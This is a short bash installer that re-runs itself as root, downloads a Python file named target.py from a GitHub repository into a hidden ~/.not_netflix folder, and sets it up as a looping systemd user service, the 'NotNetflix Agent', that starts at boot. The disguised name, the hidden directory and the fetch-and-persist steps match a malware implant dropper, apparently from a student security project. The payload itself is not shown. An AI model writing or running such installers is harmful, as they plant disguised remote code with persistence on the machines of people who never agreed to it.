#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[*] Re-running as root using sudo..."
  exec sudo "$0" "$@"
fi

# Detect real user
REAL_USER=${SUDO_USER:-$(logname)}
USER_HOME=$(eval echo "~$REAL_USER")

echo "[*] Installing NotNetflix for user: $REAL_USER"

# Setup
INSTALL_DIR="$USER_HOME/.not_netflix"
SERVICE_NAME="not_netflix"
SCRIPT_URL="https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
PYTHON=$(which python3)

# Create dir and fetch script
mkdir -p "$INSTALL_DIR"
curl -sL "$SCRIPT_URL" -o "$INSTALL_DIR/target.py"
chown -R "$REAL_USER:$REAL_USER" "$INSTALL_DIR"

# Systemd user service
SERVICE_DIR="$USER_HOME/.config/systemd/user"
mkdir -p "$SERVICE_DIR"

cat <<EOF > "$SERVICE_DIR/$SERVICE_NAME.service"
[Unit]
Description=NotNetflix Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON $INSTALL_DIR/target.py --loop
Restart=on-failure

[Install]
WantedBy=default.target
EOF

chown -R "$REAL_USER:$REAL_USER" "$SERVICE_DIR"

# Enable lingering so user service starts on boot
loginctl enable-linger "$REAL_USER"

# Reload and enable the service
sudo -u "$REAL_USER" systemctl --user daemon-reload
sudo -u "$REAL_USER" systemctl --user enable "$SERVICE_NAME"
sudo -u "$REAL_USER" systemctl --user start "$SERVICE_NAME"

echo "[+] NotNetflix agent installed successfully as a user service."

